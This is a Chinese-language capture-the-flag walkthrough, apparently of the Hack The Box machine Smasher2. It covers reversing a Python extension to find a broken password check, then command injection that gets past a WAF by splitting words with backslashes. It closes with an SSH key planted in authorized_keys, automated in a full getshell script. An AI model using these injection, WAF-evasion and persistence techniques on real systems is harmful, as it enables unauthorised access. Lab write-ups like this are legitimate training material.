<p><img src="https://0xdf.gitlab.io/img/1570906095855.png"></p>
<p>如果此比较匹配，则返回True。<br>从启动代码中记住登录对象是一个包含两个项目的列表，可能是用户名和密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login = [<span class="string">&quot;&lt;REDACTED&gt;&quot;</span>, <span class="string">&quot;&lt;REDACTED&gt;&quot;</span>]</span><br><span class="line">Managers.update(&#123;<span class="built_in">id</span>: ses.SessionManager(login, craft_secure_token(<span class="string">&quot;:&quot;</span>.<span class="built_in">join</span>(login)))&#125;)</span><br></pre></td></tr></table></figure>

<p>深入研究get_internal_usr（在Ghidra中查找反编译的代码），看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">undefined8 get_internal_usr(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (long *)PyObject_GetAttrString(param_1,<span class="string">&quot;user_login&quot;</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,0);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + -1;         // Py_DECREF</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == 0) &#123;</span><br><span class="line">    (**(code **)(plVar1[1] + 0x30))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用PyObject_GetAttrString来获取user_login对象，该对象是上面带有用户名和密码的列表。 然后在下一行检索列表中的第一项，将其作为字符串处理，并在调用Py_DECREF之后返回。 这就是所期望的。<br>现在，看看get_internal_pwd：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">undefined8 get_internal_pwd(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (long *)PyObject_GetAttrString(param_1,<span class="string">&quot;user_login&quot;</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,0);  // This should be 1, not 0</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + -1;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == 0) &#123;</span><br><span class="line">    (**(code **)(plVar1[1] + 0x30))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行相同的操作，包括获取列表中的第一项，而不是第二项。 这意味着实际上是根据存储的用户名检查密码的！<br>知道了这一点，我花了几分钟就猜出了Administrator：Administrator的凭据。 这样做时，它将返回API密钥和端点信息：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb9.jpg"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;authenticated&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="string">&quot;result&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;creation_date&quot;</span>: 1577435021,</span><br><span class="line">		<span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/&lt;api_key&gt;/job&quot;</span>,</span><br><span class="line">		<span class="string">&quot;key&quot;</span>: <span class="string">&quot;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当得到一个shell时，查看源代码，发现它试图将用户名和密码设置为无法猜测的值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login = [<span class="string">&quot;Administrator&quot;</span>, <span class="string">&quot;SuperSecretAdminPWD123!&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>但是该用户名&#x2F;密码组合无效，因为从未检查第二项。</p>
<ul>
<li>API执行</li>
</ul>
<p>现在有了api密钥，转到&#x2F;api。 给的&#x2F;api路径的代码显示可以运行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&quot;/api/&lt;key&gt;/job&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def job(key):</span><br><span class="line">    ret = &#123;<span class="string">&quot;success&quot;</span>: None, <span class="string">&quot;result&quot;</span>: None&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> manager.secret_key == key:</span><br><span class="line">        data = request.get_json(silent=True)</span><br><span class="line">        <span class="keyword">if</span> data and <span class="built_in">type</span>(data) == dict:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;schedule&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                out = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, data[<span class="string">&quot;schedule&quot;</span>]])</span><br><span class="line">                ret[<span class="string">&quot;success&quot;</span>] = True</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = out</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">                ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Missing schedule parameter.&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">            ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Invalid value provided.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">&quot;success&quot;</span>] = False</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = <span class="string">&quot;Invalid token.&quot;</span></span><br><span class="line">    <span class="built_in">return</span> jsonify(ret)</span><br></pre></td></tr></table></figure>

<p>需要发布json数据，并在其中包含一个关键时间表，该值是我要运行的值。<br>还在顶部看到一个会话检查，因此，我还将包括从Burp提取的会话cookie。</p>
<ul>
<li>运行失败</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;id&quot;&#125;&#x27;</span></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">&#x27;t have permission to access /api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>-s 允许在没有状态栏的情况下传递结果；<br>-H “Cookie: session&#x3D;eyJp …” 添加会话cookie；<br>-H “Content-Type: application&#x2F;json” 告诉服务器将POST数据作为json处理；<br>http：&#x2F;&#x2F;wonderfulsessionmanager.smasher2.htb&#x2F;api&#x2F;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&#x2F;job是登录后给出的网址；<br>–data ‘{“schedule”:”id”}’ 是要尝试运行命令ID。</p>
<ul>
<li>存在waf</li>
</ul>
<p>在代码中看不到403禁止访问。 如果密钥不匹配，我应该得到200和json，表示成功为False。 这使我认为可能存在WAF阻止请求。<br>开始使用不同的命令，以了解可以完成的工作。 id很小，但是w呢？ 它返回结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;w&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot; 09:40:47 up  3:24,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>好的，回到id，我可以在字符串中添加一些WAF规则以通过它吗？ 此链接具有一些良好的WAF规则。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb10.jpg"></p>
<p>发现了2种通过WAF执行命令的方法，包括’’和\来分解字符。</p>
<h3 id="得到user-txt"><a href="#得到user-txt" class="headerlink" title="得到user.txt"></a>得到user.txt</h3><p>使用此命令来检查home目录-只有一个：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;l\\s /home/&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;dzonerzy\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>帅的掉渣，接下来依法炮制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;l\\s -\\l\\a /home/dzonerzy/&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;total 44\ndrwxr-xr-x 6 dzonerzy dzonerzy 4096 Feb 17  2019 .\ndrwxr-xr-x 3 root     root     4096 Feb 15  2019 ..\nlrwxrwxrwx 1 dzonerzy dzonerzy    9 Feb 15  2019 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 dzonerzy dzonerzy  220 Feb 15  2019 .bash_logout\n-rw-r--r-- 1 dzonerzy dzonerzy 3799 Feb 16  2019 .bashrc\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .cache\ndrwx------ 3 dzonerzy dzonerzy 4096 Feb 15  2019 .gnupg\ndrwx------ 5 dzonerzy dzonerzy 4096 Feb 17  2019 .local\n-rw-r--r-- 1 dzonerzy dzonerzy  807 Feb 15  2019 .profile\n-rw-r--r-- 1 root     root      900 Feb 16  2019 README\ndrwxrwxr-x 4 dzonerzy dzonerzy 4096 Dec 27 08:56 smanager\n-rw-r----- 1 root     dzonerzy   33 Feb 17  2019 user.txt\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>读取user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;ca\\t /home/dzonerzy/user.txt&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;91a13e3*************************\n&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p><font color="red">为防止有人把flag拿来乱提交，故将flag打码</font></p>
<h3 id="SSH密钥投毒"><a href="#SSH密钥投毒" class="headerlink" title="SSH密钥投毒"></a>SSH密钥投毒</h3><p>我无法通过WAF获得类似我的IP地址的任何信息，所以偶然发现了一些战术。 已经在dzonerzy的主目录中。 将创建一个.ssh目录，然后上传一个密钥。<br>创建目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;mk\\dir /home/dzonerzy/.ss\\h&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>base64加密密钥并将其写入&#x2F;tmp：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># base64 -w0 /root/.ssh/id_rsa.pub</span></span><br><span class="line">c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=</span><br></pre></td></tr></table></figure>
<p>写入成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;echo \&quot;c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDOXAvYnM5c1VkeFBZeUcrQWxaVnR1ais3d3BWREFoNmpySWRVeEl4N2MrK2NldEcvdU9ZMVIyZkozTDlIQ2dqazVXRkFpTVFsMmVYVnRtdHdWRGFYN1BpdzlSek1EV05RZW9YbUt6M0l5UFcyNzJpVVN4d2Q1TTd1ZVRpdTNnSlc0U1pmTWZITi84bjZ5clNDV25qZnFPaDN2aGdWTmx0ZmFicnRRSjVPQTR3S1BTcFZHVHNMT3psUCtjNEFmWjEyNVp6RVdOU0J1WG9GaCtLUUpsUWdwY1pkN1NDVVVEWnZBdGQ4b3BaR1pib0VidzJnemdhQUQrMkZIOGxrejJHOGc2VDhtSWVyRnl2enpvSmxpVU14Q3U0U0huQ1FnVThCQjYzdThlaTFoSXk2M0hPZVkycjd5VjU2Rmd5MVNXdDN0ZVl4THk5b1FyaFVsKzJjWTRoUDFXNy95dDJwSHRyQ1Rma3M0RDFtS1o5UlJrNlJTaTc0UmtGQkVUMkExYk9ISmZtTzYxQVN4UnlZeWhPQzVzYW0yZ2F5VS9IaHIrVUtuY0crb2JXMWpGRlR4NlFoUFBuVEdjVnJVQXQ0bnY5OUdiUVh3Z2pxOFlPL0tMT091Q3Q0Z2pDYnk4NVF0b1dlZnBvTWZSTUJoSXFZZ2pvQ0RuTEVsQkc5YWZqMVJiT2M9IHJvb3RAa2FsaQo=\&quot; &gt; /tmp/luci&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在解码密钥并存储在authorized_keys中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -s -H &quot;Cookie: session=eyJpZCI6eyIgYiI6Ik16VmhZVGd3WXpObFlUTXhaalZpWWpSbE1HSXdZMlE0WkRWaFpXSTVNbU5sWm1KaFkyUmtNQT09In19.XgW_VQ.XrJU7D8e6QoVbpElCy-qxSS2PBI&quot; -H &quot;Content-Type: application/json&quot; http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data &#x27;&#123;&quot;schedule&quot;:&quot;ba\\se\\64 -\\d /tmp/luci &gt;&gt; /home/dzonerzy/.ss\\h/autho\\rized_k\\eys&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>现在可以连接了，帅炸了。。。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Fri Dec 27 10:38:23 2019 from 10.10.14.10</span><br><span class="line">dzonerzy@smasher2:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(dzonerzy) gid=1000(dzonerzy) <span class="built_in">groups</span>=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">dzonerzy@smasher2:~$ <span class="built_in">whoami</span></span><br><span class="line">dzonerzy</span><br><span class="line">dzonerzy@smasher2:~$</span><br></pre></td></tr></table></figure>

<p>还可以写成一键getshell的脚本如下所示，然后运行，非常的牛批：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cookie=$(curl -s -I  http://wonderfulsessionmanager.smasher2.htb/ | grep <span class="string">&quot;Set-Cookie&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;;&#x27;</span> -f1 | <span class="built_in">cut</span> -d= -f2)</span><br><span class="line">ssh_pub_b64=$(<span class="built_in">cat</span> /root/.ssh/id_rsa.pub | <span class="built_in">base64</span> -w0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload base64 encoded key</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;echo    \&quot;&#x27;</span><span class="variable">$ssh_pub_b64</span><span class="string">&#x27;\&quot; &gt; /tmp/df&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to upload public key to /tmp&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Uploaded base64-encoded public key to /tmp/df&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make .ssh directory</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:         &quot;mk\\dir -\\p /home/dzonerzy/.ss\\h&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to make /home/dzonerzy/.ssh directory&quot;</span>;  <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Created .ssh directory&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode Key</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;base64 -\\d /tmp/df &gt; /home/dzonerzy/.ss\\h/auth\\orized_keys&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || &#123; <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to decode key into authorized_keys&quot;</span>; <span class="built_in">exit</span> 1; &#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Decoded public key into authorized_keys file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Delete tmp file</span></span><br><span class="line">curl -s -H <span class="string">&quot;Cookie: session=<span class="variable">$cookie</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job --data <span class="string">&#x27;&#123;&quot;schedule&quot;:&quot;rm /tmp/df&quot;&#125;&#x27;</span> | grep -q <span class="literal">true</span> || <span class="built_in">echo</span> <span class="string">&quot;[-] Failed to delete encoded key from tmp. Manually rm /tmp/df&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;[+] SSH with the following command:\nssh -i /root/.ssh/id_rsa dzonerzy@10.10.10.135&quot;</span></span><br></pre></td></tr></table></figure>

